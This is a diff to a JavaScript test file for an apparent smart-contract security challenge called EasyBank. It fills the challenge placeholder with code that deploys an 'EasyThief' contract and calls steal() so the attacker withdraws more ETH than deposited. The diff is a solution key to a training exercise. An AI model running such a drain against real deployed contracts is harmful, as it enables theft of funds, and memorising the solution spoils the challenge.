@@ -39,8 +39,17 @@ describe('EasyBank', function () {
 
     before(async function () {
       //
-      // CHALLENGE: SETUP AND EXECUTE THE EXPLOIT HERE
+      // EXPLOIT IS EXECUTED HERE
       //
+
+      const ThiefContractFactory = await ethers.getContractFactory('EasyThief', thief);
+      thiefContract = await ThiefContractFactory.deploy(bankContract.address);
+      await thiefContract.deployed();
+
+      const stealTxn = await thiefContract.steal({ value: depositAmount });
+      await stealTxn.wait();
+
+      thiefEndingBalance = await provider.getBalance(thief.address);
     });
 
     it('thief should be able to withdraw more ETH than deposited via a contract', async function () {
